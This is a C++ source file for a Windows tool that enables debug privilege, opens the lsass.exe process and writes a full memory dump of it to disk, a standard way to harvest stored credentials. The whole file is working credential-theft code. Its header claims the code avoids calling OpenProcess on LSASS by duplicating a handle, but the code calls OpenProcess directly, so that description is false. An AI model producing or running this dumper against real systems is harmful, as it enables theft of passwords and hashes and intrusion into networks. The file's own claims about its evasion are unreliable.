// Filename: lsass_dumper_opsec.cpp
// Purpose: Dump LSASS memory safely by duplicating a handle from a privileged process
// Author: Joas A Santos (https://github.com/CyberSecurityUP)
// Note: This technique avoids direct OpenProcess() on lsass.exe

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <dbghelp.h>

#pragma comment(lib, "Dbghelp.lib")

DWORD GetProcessIdByName(const std::wstring& name) {
    PROCESSENTRY32W entry = { sizeof(entry) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (name == entry.szExeFile) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

bool DumpProcess(HANDLE hProcess, const std::wstring& dumpPath) {
    HANDLE hFile = CreateFileW(dumpPath.c_str(), GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    BOOL success = MiniDumpWriteDump(
        hProcess,
        GetProcessId(hProcess),
        hFile,
        MiniDumpWithFullMemory,
        nullptr,
        nullptr,
        nullptr
    );

    CloseHandle(hFile);
    return success;
}

int wmain() {
    // Step 1: Enable SeDebugPrivilege
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    DWORD lsassPID = GetProcessIdByName(L"lsass.exe");
    if (!lsassPID) {
        std::wcerr << L"[-] Could not find LSASS\n";
        return 1;
    }

    HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPID);
    if (!hLsass) {
        std::wcerr << L"[-] Could not open LSASS. Try running as Administrator.\n";
        return 1;
    }

    std::wcout << L"[+] Got handle to LSASS: 0x" << hLsass << std::endl;

    std::wstring outFile = L"lsass_dump.dmp";
    if (DumpProcess(hLsass, outFile)) {
        std::wcout << L"[+] Dump successful: " << outFile << std::endl;
    } else {
        std::wcerr << L"[-] Dump failed.\n";
    }

    CloseHandle(hLsass);
    return 0;
}
